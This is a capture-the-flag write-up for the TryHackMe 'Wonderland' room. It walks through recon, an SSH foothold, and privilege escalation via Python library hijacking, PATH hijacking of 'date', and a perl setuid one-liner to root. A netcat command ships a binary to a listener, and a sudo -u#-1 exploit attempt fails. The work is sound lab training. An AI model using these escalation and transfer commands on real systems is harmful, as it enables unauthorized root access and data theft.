# Wonderland

[Play](https://tryhackme.com/room/wonderland)

## Recon

```
❯ nmap -script=default -sV -A -T4 10.10.133.60
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-26 21:51 EST
Nmap scan report for 10.10.133.60
Host is up (0.24s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8e:ee:fb:96:ce:ad:70:dd:05:a9:3b:0d:b0:71:b8:63 (RSA)
|   256 7a:92:79:44:16:4f:20:43:50:a9:a8:47:e2:c2:be:84 (ECDSA)
|_  256 00:0b:80:44:e6:3d:4b:69:47:92:2c:55:14:7e:2a:c9 (ED25519)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Follow the white rabbit.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 53.75 seconds
```

```
❯ gobuster dir -u 10.10.133.60 -w "/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt" -x "txt,html,php"
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.133.60
[+] Threads:        10
[+] Wordlist:       /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     txt,html,php
[+] Timeout:        10s
===============================================================
2021/02/26 21:50:59 Starting gobuster
===============================================================
/index.html (Status: 301)
/img (Status: 301)
/r (Status: 301)
```

In `/img/` i first tried downloading the images and doing `strings`, I could not find anything interesting. Onto `/r/`. It says 

![](https://i.imgur.com/WDNs790.png)


Interesting. However, source shows nothing special here, and now I am stuck. But it does ask to go *somewhere*. On a pure whim, I did:

`http://10.10.133.60/r/a/b/b/i/t/`

very nice. One can also run gobuster with the url: `http://10.10.133.60/r/` and keep on getting the letters.

![](https://i.imgur.com/wXwyzP3.png)

So now we want to go to the left. How? Well lets do `http://10.10.133.60/r/a/b/b/i/`

![](https://i.imgur.com/EYBLHOF.png)

The story continues!

![](https://i.imgur.com/4J1i4TS.png)

After looking at some more, I realise: wait ... I've been going in the opposite direction! To quote:

> "Oh, you’re sure to do that," said the Cat, "if you only walk long enough."

So we must go on ... but where? I don't know. 

I was stuck for a while, and then stumbled upon the fact that its ssh `username:password`. "Open the door" makes sense now lmao.

## Foothold

I'm in!

```
alice@wonderland:~$ ls
root.txt  walrus_and_the_carpenter.py
alice@wonderland:~$ cat root.txt
cat: root.txt: Permission denied
alice@wonderland:~$ whoami
alice
alice@wonderland:~$ pwd
/home/alice
```

Okay so the walrus thing is apparently a poem. The script is supposed to spew 10 random lines. very helpful.


```
alice@wonderland:/home$ ls
alice  hatter  rabbit  tryhackme
alice@wonderland:/home$ cd rabbit/
-bash: cd: rabbit/: Permission denied
alice@wonderland:/home$ cd hatter/
-bash: cd: hatter/: Permission denied
alice@wonderland:/home$ cd tryhackme/
-bash: cd: tryhackme/: Permission denied
```

I tried locating `user.txt`, but I can't `locate` anything. Looking at the hint on TryHackMe, it could be in `/root/user.txt`. It is!

```
rabbit@wonderland:/home/rabbit$ cat /root/user.txt
thm{:stonks:}
```

## Priv Esc

We may need to get into the rabbit one. Meanwhile, let's check what we can sudo:

```
alice@wonderland:~$ sudo -l
[sudo] password for alice: 
Matching Defaults entries for alice on wonderland:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alice may run the following commands on wonderland:
    (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```

Ah so we can execute the script as rabbit. `alice@wonderland:~$ sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py`

This means we can spawn a shell as rabbit!

But ... we do not have any permissions to write the file. So how? Well, this is something called **python library hijacking**. Take a wild guess to what we are going to do.

Yeah, create a file called `random.py`, essentially overriding the actual random library. Lesgooo!

`random.py` looks as: `import pty; pty.spawn("/bin/bash")`. easy.

Executing, we have:
```
alice@wonderland:~$ sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py 
rabbit@wonderland:~$ 
```

YES! okay so we see:
```
rabbit@wonderland:/home/rabbit$ ls
teaParty
```

which has a set bit ...!?

```
rabbit@wonderland:/home/rabbit$ ./teaParty 
Welcome to the tea party!
The Mad Hatter will be here soon.
Probably by Sat, 27 Feb 2021 05:19:12 +0000
Ask very nicely, and I will give you some tea while you wait for him

Segmentation fault (core dumped)
```

This may include some reverse engineering. Anyways, linpeas gave us this:

```
[+] Sudo version
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-version                                                         
Sudo version 1.8.21p2 
```

However, 

```
rabbit@wonderland:/home/rabbit$ sudo -u#-1 /bin/bash
sudo: unknown user: #-1
sudo: unable to initialize policy plugin
```

So, back to reverse engineering it is! I wanted to start off with `strings`, but it does not want to work, since strings is not present on that machine. So, I need to transfer the file to my machine, then extract out the information I need.

For this, we start `nc` on both; 

`rabbit@wonderland:/home/rabbit$ nc 10.8.150.214 1234 < teaParty`

Explaination: netcat tries to connect to the IP `10.8.150.214` on the port `1234` using `TCP`, and takes in the file as the input.

`❯ nc -lnvp 1234 > temp`

Explaination: netcat *listens* on the port `1234` on your machine, outputting all the contents into a file called `temp`.

Ok! Doing strings, we see: `/bin/echo -n 'Probably by ' && date --date='next hour' -R`

We can make use of the `date` library in C. Also, no matter our input, we get `Segmentation fault (core dumped)`, as its in the string. Very sneaky! Now, we want it to execute the `date` file. We can just write: `bash` in it and make it executable by using `chmod +x date`.

```
rabbit@wonderland:/home/rabbit$ PATH=/home/rabbit:$PATH ./teaParty 
Welcome to the tea party!
The Mad Hatter will be here soon.
Probably by hatter@wonderland:/home/rabbit$ 
```

:D Inside of `/home/hatter`, we get

```
hatter@wonderland:/home/hatter$ cat password.txt 
<PASSWORD>
```

Now, we can login as hatter normally, instead of this convoluted mess. 

(We are still in alice's random's rabbit's teaParty shell lmao)

Okay take a deep breath in. Fresh shell! However ...

```
hatter@wonderland:~$ sudo -l
[sudo] password for hatter: 
Sorry, user hatter may not run sudo on wonderland.
```

SMH.

Time for linpeas again!

```
❯ scp ~/Desktop/Tools/linpeas.sh hatter@10.10.27.106:~
hatter@10.10.27.106's password: 
linpeas.sh                    100%  313KB 188.7KB/s   00:01    
```

Okay so the below pops out, talking about suid bit setting capabilities:

```
Files with capabilities:
/usr/bin/perl5.26.1 = cap_setuid+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/perl = cap_setuid+ep
```

Perl looks tasty, so [gtfobins](https://gtfobins.github.io/gtfobins/perl/#capabilities) tells us the following.

`cp $(which perl) .`

```
hatter@wonderland:~$ perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
# whoami
root
```

EASY!
